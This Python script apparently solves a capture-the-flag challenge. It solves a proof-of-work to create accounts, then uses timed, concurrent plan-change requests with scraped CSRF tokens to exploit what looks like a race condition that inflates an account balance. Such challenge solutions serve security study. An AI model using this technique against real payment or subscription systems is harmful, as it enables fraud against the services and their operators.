#!/usr/bin/env python3
import requests, re, hashlib, multiprocessing, time

def solve(prefix, difficulty=22):
    zeros = '0' * difficulty
    def is_valid(digest):
        bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
        return bits[:difficulty] == zeros
    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest()):
            return str(i)

urls = '''
http://140.113.203.209:17385/4JwXoHc5-54JCrBY4YwAVA
http://140.113.203.209:17385/UEpymzinPTqx_1bvIDi6nQ
http://140.113.203.209:17385/urZBjE0tOCxUuVwxYB-xPg
http://140.113.203.209:17385/l-cx-mCaU6YQHsv_0yg_fA
http://140.113.203.209:17385/3A2s1wvFzYGrnvNF2jV--A
http://140.113.203.209:17385/zMDUG2Zuk3FYRZjz4RaK2g
http://140.113.203.209:17385/rcboT7aoKzJoKMqv34-loA
http://140.113.203.209:17385/0g5YiHRpRJCn2M6ZUZ8HxQ
http://140.113.203.209:17385/SZnF3RhDu3a1HGAy0Q2yag
http://140.113.203.209:17385/Nxu-kwJdhdc7POr2VTuL4g
http://140.113.203.209:17385/ojpTK7mDj0uNBLmLkpLd6A
'''.strip().splitlines()

s = requests.session()

while len(urls) < 11:
    r = s.get('http://140.113.203.209:17385/').text
    prefix = re.findall('<code>(.*)</code>', r)[0]
    u = s.get('http://140.113.203.209:17385/', params=dict(answer=solve(prefix)), allow_redirects=True).url
    print(u)
    urls.append(u)

def send_req(url, plan=1):
    s = requests.session()
    r = s.get(url).text
    csrf = re.findall('name="csrf" value="(.*)"', r)[0]
    r = s.post(url, data=dict(plan=plan, csrf=csrf)).text
    print('url=', url, 'csrf=', csrf, 'r=', r[:16])
    assert 'Thank you' in r

def get_balance(url):
    r = s.get(url).text
    b = re.findall('Your account balance: <b>\\$ ([0-9]*)</b>', r)[0]
    return int(b)

master, slaves = urls[0], urls[1:]
print('master', m_b:=get_balance(master))
print('slaves', s_bs:=[get_balance(slave) for slave in slaves])
assert all([m_b] + s_bs) # make sure none is bankrupt
send_req(master, plan=2)
print('wait for 1795 sec')
time.sleep(1795)
last_t = time.time()
print('awake! sending slaves at', last_t)
with multiprocessing.Pool(10) as p:
    for _ in p.imap_unordered(send_req, slaves):
        pass
print('done at', time.time() - last_t)
time.sleep(6)
print('master', m_b:=get_balance(master))
time.sleep(90)
print('slaves', s_bs:=[get_balance(slave) for slave in slaves])
